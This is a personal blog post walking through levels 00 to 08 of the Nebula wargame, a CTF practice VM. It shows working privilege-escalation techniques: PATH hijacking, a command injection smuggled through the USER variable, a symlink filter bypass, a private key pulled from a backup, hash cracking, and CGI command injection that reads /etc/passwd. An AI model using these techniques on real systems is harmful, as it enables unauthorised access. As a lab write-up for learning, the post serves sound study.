---
layout: post
title: Nebula Walkthrough
date: 2016-05-08 22:38:50.000000000 -03:00
type: post
published: true
status: publish
categories: []
tags:
- CTF
- pen-testing
- security
- wargames
meta:
  _oembed_fe63bda592030c7a229f4fdb1ad240bc: "{{unknown}}"
  _oembed_71b7afba573ebaf52e40ae0c9b81c772: "{{unknown}}"
  _oembed_4bca61f1ffd8af631aedf56520479cfb: "{{unknown}}"
  _oembed_f6aa965b54029085ef4684b811119da6: "{{unknown}}"
  _oembed_0aa3f08d22b103c287dc4570df1b095c: "{{unknown}}"
  _oembed_832b130e0cdbfdf4f2720bc5df93dca8: "{{unknown}}"
  _oembed_b7f700094cdb1e1a411061d5312edce3: "{{unknown}}"
  _oembed_9d88dfbdd83f4e99a8a107deeda0ff15: "{{unknown}}"
  _rest_api_published: '1'
  _rest_api_client_id: "-1"
  _publicize_job_id: '22612935831'
  _oembed_7bf3ad534887ade3e3266eba597c3e4c: "{{unknown}}"
  _oembed_f2569912434de301119819960214d4f0: "{{unknown}}"
  _oembed_ed38e8fc87e324de03fd42d4e620cac3: "{{unknown}}"
author:
  login: tidlost
  email: tl.dr.mfw@gmail.com
  display_name: tidlost
  first_name: ''
  last_name: ''
---
I started doing the challenges in Nebula. They are not as fun as boot2root VM:s but still entertaining. And I have learned some new stuff from it.
I have decided to write down all the levels in this one post, otherwise it would be too many short posts. So this is going to be a giant one, and sometimes way to much detail, and somtimes not enough, of well. Let's start.

## Level 00
We just need to find the flag on this level.


```
$ find / -user flag00 -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /bin/.../flag00
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /rofs/bin/.../flag00
```


Search for user flag00, with permission 4000, executable. List the
output. Throw stderr in /dev/null.



## Level 01
On this level we are provided with code written in C and the binary version of it. It can be found here: /home/flag01/flag01


```
$ file flag01
flag01: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
```


So we know that it is a 32bit setuid-binary. So when we run the binary the code that gets executed gets executed as the user flag01.


```
total 13
drwxr-x--- 2 flag01 level01   92 2011-11-20 21:22 .
drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..
-rw-r--r-- 1 flag01 flag01   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag01 flag01  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01
-rw-r--r-- 1 flag01 flag01   675 2011-05-18 02:54 .profile
```


Since I am a total noob in C I am going to comment this code pretty heavy to understand what is going on.


```c
#include <stdlib.h>
// This is what is says. C's standard library. Useful general
// purpose functions. Generating random numbers, conversions, memory allocation: malloc
// process control. It is from this lib that "system" is taken.
#include <unistd.h>
// Provides access to POSIX API.
// Gives the programmer access to NULL pointer, and symbolic constants like SEEK_SET
#include <string.h>

// A library for manipulating strings.
#include <sys/types.h>
// This library gives access to different data-types. Like gid_t.
#include <stdio.h>
// The standard input and output library.
// printf and scanf are among those functions. printf outputs, and scanf takes input.
int main(int argc, char **argv, char **envp)
// Here we initiate the main function, we do this with three arguments.
// argc is the number of argumnets. Argument count. The count starts from the
// calling of the binary. So ./flag01 is the first argument.
// argv are the argumnets that the user inputs. In this program it appears to be none.
// envp is an array of the environment variables.
{
  gid_t gid;
  uid_t uid;
// Here we declare two variables, but we don't assign them any value.
// We use the data-typs that come from sys/types-lib.
// The data-types are group-id and user-id.
  gid = getegid();
  uid = geteuid();
// This gets the group-id and user-id of the current user. Which is flag01.
// And we assign the the value to the previously created variables.
  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);
// So this sets the real, effective and saved uID.
  system("/usr/bin/env echo and now what?");
// This uses the system-function, which let us use the unix-commands/programs.
// The commands run are first printing the environment variables, and then it echos "and now what?"
}
```


How can this then be exploited? Since there is no user-input.
So I figure that I can overwrite the echo-command with a command that I call echo, but does something else.
This kind of explains the way to do this.
http://unix.stackexchange.com/questions/29608/why-is-it-better-to-use-usr-bin-env-name-instead-of-path-to-name-as-my
So I wrote that program in bash

```
#!/bin/bash
/bin/bash
```

Then chmod +x echo, and export PATH=/tmp:$PATH. Now, it is important here to add the echo to the beginning of the PATH-variable, otherwise it will execute the normal echo.

```
./flag01
whoami
flag01
```

We got the flag!

## Level 02

So on this level we have another setuid to play with.
```
cd /home/flag02
level02@nebula:/home/flag02$ file flag02
flag02: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
```
Let's run it and see what happens.
```
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo level02 is cool")
level02 is cool
```

This looks a bit like the first level. But let's analyze the code.

```c
#include <stdlib.h>
// Standard-lib.
#include <unistd.h>
// Lib to get getegid()
#include <string.h>
// Lib to manipulate strings
#include <sys/types.h>
// Get new data-types, like gid_t
#include <stdio.h>
// Standard i/o. printf, scanf for example
int main(int argc, char **argv, char **envp)
{
  char *buffer;
// Declare the variable buffer.
  gid_t gid;
  uid_t uid;
// Declare variables.
  gid = getegid();
  uid = geteuid();
// Assign uID and gID into the created varibles.
  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);
// Set UID.
  buffer = NULL;
// Assign the value NULL to the buffer-varible.
  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
// Lets break it down.
// asprintf auto-allocate memory, it doesn't have to receive a specific buffer-size.
// it acquires it dynamically. In a way it is a way to defend against buffer overflow. Since the buffer cant be overflown because it is dynamic, I think.
// asprinf calculates the length of the string, allocates the amount of memory
// and then writes the string into that memory.
  printf("about to call system(\"%s\")\n", buffer);
// So, the asprintf takes the getenv-username and inputs it into the buffer.
// Then we make a system-call using that buffer.
  system(buffer);
}
```
Okay, so no user-input is possible. So the solution will be elsewhere.
So we make a system-call that is the following:
"/bin/echo username (taken from en-var) is cool"
So the solution that comes to mind is to insert a username that would be something like
the following: hello && /bin/bash # echo
So I set the username in my environment variable like this:
```
USER="&& /bin/bash #"
```
Then I ran the script, and it gave me the shell, and
 then I could just run getflag.
## Level 03
So on this level we have one file and one directory.
```
level03@nebula:/home/flag03$ ls -lah
total 5.5K
drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 .
drwxr-xr-x 1 root   root     180 2012-08-27 07:18 ..
-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag03 flag03  3.3K 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile
drwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh
```
The dir is read and writable. And the writable.sh-file looks like this:

```bash
#!/bin/sh
for i in /home/flag03/writable.d/* ;
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

So here we can se that it takes all the scripts in writable.d and executes them, every few minutes, with a cronjob.
So after a lot of work, and a lot of testing. Like copying the sh and much other. i realized I didn't have to get a shell, all i need is to execute getflag on the machine.
So I just wrote the following script:

```bash
#!/bin/bash
getflag > /tmp/flaggan.txt
```
I also tried to copy the shell from the flag03-user and give me permissions to use it, but it didn't work. Not really sure why. But anyways, I got the flag.
## Level 04
"About
This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)
To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04."

```c
#include <stdlib.h>
// Standard lib
#include <unistd.h>
// getresid comes from here i think
#include <string.h>
// Lib to manipulate strings
#include <sys/types.h>
// Includes the datatype guid
#include <stdio.h>
// Standard I/O
#include <fcntl.h>
// The file control-options.
// To input output files, open them, close them, open dirs etc
int main(int argc, char **argv, char **envp)
{
  char buf[1024];
// Here the buffer. The buffer is a kind of intermediare between memory and program.
// So the buffer have a maximum of 1024 bytes. That is one kilobyte.
  int fd, rc;
// Here we declare two variables.
  if(argc == 1) {
    // What to do if there is only one cli-argument.
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
    // EXIT_FAILURE comes from some std lib.
    // This seems to be mostly harmless.
  }
  if(strstr(argv[1], "token") != NULL) {
    // So this occurs only if the variable name is token.
    // strstr evaluates if the first argument contains anything from the second.
    // So we can't ever read any file that contains the word token in it.
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }
  fd = open(argv[1], O_RDONLY);
  // Here we initialize and declare the fd variable.
  // It appears to open the file, in a read-only manner, and then save it in
  // the variable fd.
  if(fd == -1) {
    // This statement fires if a file doesn't exist, I think.
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }
  rc = read(fd, buf, sizeof(buf));
// So here we take the input file, and read it. The buffer-size is here.
  if(rc == -1) {
    // If the file somehow doesn't exists it throws this error.
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }
  write(1, buf, rc);
  // Here we write to standard out (the 1 indicates it).
}
```
I started trying to encode the file name and some other stuff, that didn't work. Then it hit me. I can just create a link.
```
level04@nebula:/tmp/04$ ln -s /home/flag04/token ./test
level04@nebula:/tmp/04$ ls
test  test.sh
level04@nebula:/tmp/04$ /home/flag04/flag04 ./test
06508b5e-8909-4f38-b630-fdb148a848a2
```
Wohoo, it worked!
## Level 5
About
Check the flag05 home directory. You are looking for weak directory permissions
To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.
So I just read the files.

```
level05@nebula:/home/flag05/.backup$ tar -Oxf backup-19072011.tgz .ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLAINcUvucamDG5PzLxljLOJ/nrkzot7EQJ9pEWXoQJC0/ZWm+ezhFHQd5UWlkwPZ2FBDvqxdcrgmmHT/FVGBjK0XWGwIkuJ50nf5pbJExi2SC9kNMMMP2VgY/OxvcUuoGhzEISlgkuu4hJjVh3NeliAgERVzxKCrxSvW48wcAxg4v5vceBra6lY7u8FT2D3VIsHogzKN77Z2g7k2qY82A0vOqw82e/h6IXLjpYwBur0rm0/u3GFB1HFhnAxuGcn4IsnQSBdQCB2S+eOUZ4PmiQ/rUSHuVvMeLCzrxKR+UG9zDwoCwwXpNJehAQJGCiL3JzBNnLjFaylSqKP6xj7cR user@wwwbugs
```


```
level05@nebula:/home/flag05/.backup$ tar -Oxf backup-19072011.tgz .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAywCDXFL7nGpgxuT8y8ZYyzif565M6LexECfaRFl6ECQtP2Vp
vns4RR0HeVFpZMD2dhQQ76sXXK4Jph0/xVRgYytF1hsCJLiedJ3+aWyRMYtkgvZD
TDDD9lYGPzsb3FLqBocxCEpYJLruISY1YdzXpYgIBEVc8Sgq8Ur1uPMHAMYOL+b3
Hga2upWO7vBU9g91SLB6IMyje+2doO5NqmPNgNLzqsPNnv4eiFy46WMAbq9K5tP7
txhQdRxYZwMbhnJ+CLJ0EgXUAgdkvnjlGeD5okP61Eh7lbzHiws68SkflBvcw8KA
sMF6TSXoQECRgoi9ycwTZy4xWspUqij+sY+3EQIDAQABAoIBAAGir2w+/ufzs3Pm
xGKf5nc8rY0gSl5VnIeUyp1iWylmITcxifiO5ZUo9rZzgXXeWB37a2eC6V1Fya4c
7jaYx24FGzruXMYO9rfZzgLrbQAJL3YepcwnWGzTpJk90Kulv1zuGecHMk6ZcvGx
bRysutAKmIXwSR9oQ3BOOkyTKKtI6YeKSnUNU1KVO1t//ps2wFcfXRFb17prpokx
5clWwfUYRLBQlB4XjBIJ3tswpyC0PNOFfzoF+VeUlN9XZFrL0JWHX1F9DDOFJYL5
bXw7zwhjEvZ0/qOvZSJiH4lkbmANsBeMNY/JOGV6T7dWthKBGehCnupeADZVaSeo
Qlysa0ECgYEA6x4FwgpeqNtNGeCcSAUtoviTYMD5LfMEpY8t9eGdRpzw1CDlmG9x
k1LgzE3eA0qlJYx5NNqYEefIPVLdmSuSGS/5KqHeB8Ph7+WqLmguwIIIrfRJoPaD
ON2XqLU6YzAEazTrXnqALjOvP3qdN57xK0zoBAfYlkXJRgMYE1S23YsCgYEA3QhF
Fl11csPc2Yyz/7+9MG9JnOckYvuir+bf3fj/HEuIC9ylwXd4GfSLAW02Sg8DlfRh
M7MxCW9OEWtKgUtHe3fGc6/6X1yF7QfeAYZm8UX/fo6PxuX++mvfPxM4i6vRjgzB
Qy8WisqTK9nLZO+hEdPoVqalz0iUsvu2umz0CVMCgYAsNoUWrCSI1FR3XUmGMZMX
Zm8wbpltDpn9GCOobTjKIpEXEuiZ9bsB3T/wq2Poco0DtprEWabnFxMMlRyexRbA
LclJPw8lnqxKFIIgH+9KvCktrRZ7cl/SvbjbPNkx9cGe92Cbb6XTCl0WLtSJtRXc
8qVevKr59z2WMNbCK9gHaQKBgQDRaQNjpBohKFX2OytSU8uftuBMamV77iJ9e0SA
Hmc83IbBjkPwnwrHtHt6V4lG8yCXktgAznXYFX8mW7tT8gmAfcMkWgbhEFzGbFy2
nyqqzoG42sJ3U/KWOVtifAhns9qvNYBo8ZTu2+xBcHAWaj31EQqgBfU0BPT0+ixu
RcmThwKBgAi0ej7ylHhtwODQGghRmDpxEx9deJ0jilM2EnqIecJj5jnPW8BKDgV4
Dc1QljBeCQ1r30DGYmOIazbhm+orm4df6HWPayRhNBlkmulqTs5GHvLMPjcKMB0k
0Xna7QOtBAnzoHpLcrfvBdfRNE1eC87YkPUhmm5hBgG0+TeMmWgr
-----END RSA PRIVATE KEY-----
```

Then I saved it down and sshed into the flag-user.

```
level05@nebula:/tmp/05/.ssh$ ssh -i id_rsa flag05@192.168.1.105
```

## Level 06

Old unix-passord-config. Okay, I know that passowrd were stored in /etc/passwd before they where stored in shadow.

```
cat /etc/passwd
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
```

Looks like it can be done with john the ripper.
So I just copy-pasted the hash into a file and then ran john on it like this

```
 $ john level06Hash
Using default input encoding: UTF-8
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX-16])
Press 'q' or Ctrl-C to abort, almost any other key for status
hello            (?)
1g 0:00:00:00 DONE 2/3 (2016-05-08 11:29) 2.777g/s 355.5p/s 355.5c/s 355.5C/s 123456..marley
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

So that was easy.

## Level 07
This level was a bit tricky. It is about teaching command injection.
So these articles were really useful.
http://www.golemtechnologies.com/articles/shell-injection
https://www.owasp.org/index.php/Testing_for_Command_Injection_%28OTG-INPVAL-013%29
So we have a few files.
.lesshst - that the history from the program less

```
level07@nebula:~$ cat .viminfo
# File marks:
'0  1  0  ~/index.cgi?Host=|getflag|
'1  1  0  ~/index.cgi
# Jumplist (newest first):
-'  1  0  ~/index.cgi?Host=|getflag|
-'  1  0  ~/index.cgi
-'  1  0  ~/index.cgi
# History of marks within files (newest to oldest):
> ~/index.cgi?Host=|getflag|
	"	1	0
```

And here is the cgi-code.

```perl
  #!/usr/bin/perl
  use CGI qw{param};
  print "Content-type: text/html\n\n";
  sub ping {
    $host = $_[0];
    print("<html><head><title>Ping results</title></head><body><pre>");
    @output = `ping -c 3 $host 2>&1`;
    foreach $line (@output) { print "$line"; }
    print("</pre></body></html>");
  }
  # check if Host set. if not, display normal page, etc
  ping(param("Host"));
```

I had never really looked at perl-code before. But it kind of made some sense I guess.
The config-file specified a port

```
# Specifies an alternate port number to listen on.
port=7007
dir=/home/flag07
```

So I found that port, and started curling to se what I could run. After a lot of trial and error
I found a way to do it:
curl "http://nebula.dev:7007/index.cgi?Host=www.google.com|getflag"
I also learned that you have to encode spaces correct otherwise the sever will get all confused. So if you wanna run any command with spaces you do it like this:
http://nebula.dev:7007/index.cgi?Host=%3Bcat%20/etc/passwd
I had to encode the semicolon. That was the key to it!

## Level 08

This is for sure my favorite level so far. I really enjoy analyzing packets.
So first I moved the pcap-file to my computer with netcat, and then I opened it up in wireshark.
There was no http-requests. So I guess this traffic was not on the web.
There are two machines talking:
59.233.235.218 - 39247
59.233.235.223 - 12121
So looking at the packets we can tell that the machines are in Bejing, both of them. The source and destination corrdinates show that they are in the same place.
After looking up the ports I found this:
http://www.speedguide.net/port.php?port=12121

```
12121 	tcp 	trojans 	Backdoor.Balkart (2004.09.02) - a backdoor trojan horse that can act as a HTTP proxy or FTP server
Port is also IANA registered for NuPaper Session Service 	SG
12121 	tcp,udp 	nupaper-ss 	NuPaper Session Service 	IANA
12121 	tcp 	threat 	Balkart
```

Even though it doesn't really say in the challenge what kind of traffic this is, I like to image that it was someone who had infected the 12121 computer with the Balkart-trojan. <a href="https://www.symantec.com/security_response/writeup.jsp?docid=2004-090212-3607-99">This one</a>. But it doesn't really matter, it is irrelevant for this challenge.
So I went over the packets and found some interesting ones.

```
 #'
 0000   ff fa 20 00 33 38 34 30 30 2c 33 38 34 30 30 ff  .. .38400,38400.
 0010   f0 ff fa 23 00 53 6f 64 61 43 61 6e 3a 30 ff f0  ...#.SodaCan:0..
 0020   ff fa 27 00 00 44 49 53 50 4c 41 59 01 53 6f 64  ..'..DISPLAY.Sod
 0030   61 43 61 6e 3a 30 ff f0 ff fa 18 00 78 74 65 72  aCan:0......xter
 0040   6d ff f0                                         m..
  38400,38400#SodaCan:0'DISPLAYSodaCan:0xterm
  ""bb	B
1!
```

But I couldn't piece it all together. So after analyzing every single packet separtely, I realized that the packages come and go in different
order, an order that doesn't make sense. So I learned something reaally useful. Right-click on a package and then
click on: follow, and then tcp-stream. This way we can see the full interaction, all packets combined to one.

```
..%..%..&..... ..#..'..$..&..... ..#..'..$.. .....#.....'........... .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm.........."........!........"..".....b........b....	B.
..............................1.......!.."......"......!..........."........"..".............	..
.....................
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)
..wwwbugs login: l.le.ev.ve.el.l8.8

level8
..
Password: backdoor...00Rm8.ate
Password: backd00Rmate
.
..
Login incorrect
wwwbugs login:
```

So the password looked pretty strange. And it didn't work. But after I checked the tcp-stream in hex it became clear that the dot's in the password was f7 in hex. f7 represents DEL. So every f7 was the user deleting letters. I guess he/she has problem remembering his/her own password.
So this:
Password: backdoor...00Rm8.ate
Became this:
Password: backd00Rmate

## Level 09
I will continue some other day.
